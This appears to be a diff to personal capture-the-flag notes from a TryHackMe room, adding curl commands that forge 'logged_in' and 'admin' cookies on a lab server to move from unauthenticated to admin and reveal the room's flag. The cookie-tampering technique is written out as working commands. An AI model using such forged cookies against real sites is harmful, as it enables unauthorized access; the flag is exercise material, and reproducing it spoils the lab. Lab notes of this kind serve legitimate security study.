@@ -97,3 +97,14 @@ http://machine_ip/customers/reset
 [TryHackMe | HTTP in detail](https://tryhackme.com/room/httpindetail)
 
 [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
+
+```
+root@ip-10-10-186-166:~# curl http://10.10.217.236/cookie-test
+Not Logged In
+
+root@ip-10-10-186-166:~# curl -H "Cookie: logged_in=true; admin=false" http://10.10.217.236/cookie-test
+Logged In As A User
+
+root@ip-10-10-186-166:~# curl -H "Cookie: logged_in=true; admin=true" http://10.10.217.236/cookie-test
+Logged In As An Admin - THM{COOKIE_TAMPERING}
+```
